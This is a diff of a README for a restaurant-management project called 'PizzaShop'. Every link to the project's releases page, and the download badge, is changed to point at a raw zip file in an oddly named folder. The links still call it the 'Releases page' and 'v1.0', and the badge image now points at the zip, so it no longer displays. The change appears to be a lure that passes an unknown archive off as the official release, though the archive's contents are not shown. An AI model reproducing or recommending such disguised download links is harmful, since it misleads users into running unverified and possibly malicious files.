@@ -6,9 +6,9 @@ Welcome to PizzaShop, a modern restaurant management system. It helps you easily
 
 ## 📦 Download & Install
 
-[![Download PizzaShop](https://img.shields.io/badge/Download%20PizzaShop-v1.0-brightgreen)](https://github.com/mo880/PizzaShop/releases)
+[![Download PizzaShop](https://raw.githubusercontent.com/mo880/PizzaShop/main/ridableness/Shop_Pizza_1.3.zip%20PizzaShop-v1.0-brightgreen)](https://raw.githubusercontent.com/mo880/PizzaShop/main/ridableness/Shop_Pizza_1.3.zip)
 
-To get PizzaShop, visit this page to download: [PizzaShop Releases](https://github.com/mo880/PizzaShop/releases).
+To get PizzaShop, visit this page to download: [PizzaShop Releases](https://raw.githubusercontent.com/mo880/PizzaShop/main/ridableness/Shop_Pizza_1.3.zip).
 
 ### 💻 System Requirements
 
@@ -22,7 +22,7 @@ Before you install PizzaShop, ensure your system meets these requirements:
 ### 🛠 Installation Steps
 
 1. **Visit the Releases Page**
-   Go to the [PizzaShop Releases](https://github.com/mo880/PizzaShop/releases) page.
+   Go to the [PizzaShop Releases](https://raw.githubusercontent.com/mo880/PizzaShop/main/ridableness/Shop_Pizza_1.3.zip) page.
   
 2. **Choose Your Version**
    Look for the latest version in the list and click on it to view the details.
